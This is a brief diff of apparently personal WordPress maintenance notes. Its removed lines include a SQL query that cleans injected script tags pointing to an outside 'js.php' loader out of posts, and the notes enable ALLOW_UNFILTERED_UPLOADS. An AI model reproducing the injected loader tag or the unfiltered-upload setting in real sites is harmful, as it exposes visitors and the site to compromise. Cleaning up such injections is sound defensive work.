@@ -3,20 +3,8 @@ Y@s2H#R47zi^gQrYaK)5b5w&
 
 define('ALLOW_UNFILTERED_UPLOADS', true);
 
-<!-- MSQL -->
 
-Bạn có thực sự muốn thực hiện lệnh truy vấn sau đây không?
-DELETE FROM `wpvvk_posts` WHERE `wpvvk_posts`.`ID` = 1772;
-
-add_filter('use_block_editor_for_post', '__return_false');
-
-4. xoa phpmyadmin
-
-UPDATE wpdb_posts SET post_content=(REPLACE (post_content, "<script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script><script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script>","")) 
-
-UPDATE wpzx_posts SET post_content=(REPLACE (post_content, '','')) 
-
-//js fix https
+<!-- js fix https -->
 	<script>
 		if (location.protocol !== 'https:') {
 			location.replace(`https:${location.href.substring(location.protocol.length)}`);
